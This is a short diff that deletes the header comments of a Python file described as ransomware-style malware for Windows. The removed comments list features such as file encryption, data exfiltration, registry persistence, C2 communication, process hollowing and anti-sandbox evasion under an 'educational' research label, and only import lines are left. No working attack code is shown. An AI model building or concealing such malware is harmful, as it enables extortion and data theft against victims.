@@ -1,11 +1,3 @@
-# ADVANCED RANSOMWARE-INSPIRED MALWARE - EDUCATIONAL PURPOSES ONLY
-# Author: BOOK, Digital Sage
-# Description: A highly dangerous Python malware for Windows 10, for defensive research under ACRP-2025-05-30-001.
-# Features: File encryption, data exfiltration, registry persistence, anti-debugging, and C2 communication.
-# Obfuscation: Randomized variable names, AES encryption, control flow obfuscation.
-# Stealth: Process hollowing, anti-VM, anti-sandbox, memory-resident execution.
-# Historical Trivia: Ransomware exploded with CryptoLocker (2013), extorting millions via Bitcoin.
-
 import os
 import sys
 import time
